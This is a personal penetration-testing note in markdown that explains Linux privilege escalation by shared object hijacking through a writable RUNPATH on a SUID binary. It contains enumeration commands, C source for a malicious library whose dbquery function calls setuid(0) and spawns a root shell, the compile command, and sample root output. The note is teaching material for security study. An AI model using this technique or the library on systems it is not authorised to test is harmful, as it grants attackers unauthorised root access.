---
Primary_category: "[[LIBRARY ABUSE]]"
title: "SHARED OBJECT HIJACKING"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LIBRARY ABUSE]]

#### *Runpath Hijacking*

Programs and binaries usually use custom libraries. If we find an interesting binary during our local assessment to achive *privilege escalation*, we can use certain tools to print the *shared objects ( Dynamic Libraries )* required by a binary

Let's say that the given binary has the *SUID* bit set and its owner is *ROOT*, so we can run the binary as *ROOT* basically

Then, we could place a malicious *shared object* library in an specific location so that it loads at runtime instead of the legitimate library

Then, we will obtain a shell as *ROOT* when we run the binary

##### *Requirements*

To leverage this technique, certain requirements must be met

- ***The binary must be privileged ( e.g. [[LINUX SPECIAL PERMISSIONS#SETUID|SUID]] bit set, [[LINUX SPECIAL PERMISSIONS#Sudo Permissions|Sudo]] privileges, sensitive [[LINUX CAPABILITIES|Capabilities]] and so on )***

- ***The current user must have WRITE privileges on the path specified on the binary's RUNPATH directive***

##### *Abuse*

So, let's suppose that we have gained access to the target by leveraging a security flaw discoverd on the hosted web application, which allowed us to execute system commands and, as a result, establish a ***[[SHELLS AND PAYLOADS#Reverse Shell|Reverse Shell]]*** to the target

Once we are inside it, we start our local enumeration stage by listing the *sudo* privileges of the current user. But we get nothing

Then, we continue by listing the existing binaries with the *SUID* bit set. Doing so, we find out an interesting custom binary, so we proceed to check if the binary in question has a *RUNPATH* or *RPATH* directive set within it

##### *Checking RUNPATH directive on the privileged binary*

To do so, we can proceed as follows

###### *Readelf*

```bash
readelf --dynamic ./binary | grep -iP --color -- 'rpath|runpath'
```

> [!NOTE]- *Command Output*
>
> ```bash
> 0x000000000000001d (RUNPATH)            Library runpath: [/libraries]
> ```
>

###### *Objdump*

```bash
objdump --all-headers ./binary | grep -iP --color -- 'rpath|runpath'
```

##### *Verifying Write permissions on the RUNPATH directory*

Once we know which is the *RUNPATH* directory, we have to check if the current user has *WRITE* permissions on the given directory

Just run an **`ls`** command to validate it

```bash
ls -l /libraries/
```

> [!NOTE]- *Command Output*
>
> ```bash
> total 8
> drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
> drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
> ```
>

At this point, we know that any library that we place within the directory above will take precedence over other folders due to the *RUNPATH* directive

##### *Finding out the function name called by the binary*

Before compiling a malicious library and store it within the *RUNPATH* directory, we need to find the function name called by the binary

To do so, first, we must know which is the name of the library required by the privileged binary and located within the *RUNPATH* directory

###### *Listing the required shared objects by the binary*

```bash
ldd ./binary
```

> [!NOTE]- *Command Output*
>
> ```bash
> linux-vdso.so.1 (0x00007ffef91f2000)
> libshared.so => /libraries/libshared.so (0x00007f7dece7e000)
> libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7deca8d000)
> /lib64/ld-linux-x86-64.so.2 (0x00007f7ded080000)
> ```
>

Now we know that the library is */libraries/libshared.so*

Next, we have to copy an existing *dynamic* library to the *RUNPATH* directory with the same name as the resource above i.e. *libshared.so*

###### *Copying an existing shared object to the RUNPATH directory*

```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /libraries/libshared.so
```

Then, we run the binary to see which function ( *symbol* )  is missing within the given *shared object*

###### *Running the binary to find out missing functions*

```bash
./binary
```

> [!NOTE]- *Command Output*
>
> ```bash
> ./binary: symbol lookup error: ./binary: undefined symbol: dbquery
> ```
>

##### *Creating a malicious Shared Object*

At this point, we know the missing function, so we can create a *libshared.c* file containing a *dbquery* malicious function and compile it to create a *shared object* called *libshared.so*

> [!BUG]- *libshared.c*
>
> ```bash
> #include<stdio.h>
> #include<stdlib.h>
> #include<unistd.h>
> 
> void dbquery() {
>     printf("Malicious library loaded\n");
>     setuid(0);
>     system("/bin/sh -p");
> }
> ```
>

##### *Compiling the malicious SO*

```bash
gcc -fPIC -shared -o ./libshared.so ./libshared.c
```

##### *Running the privileged binary*

```bash
./binary
```

> [!NOTE]- *Command Output*
>
> ```bash
> # id
> uid=0(root) gid=1000(4l3xbb) groups=1000(4l3xbb)
> ```
>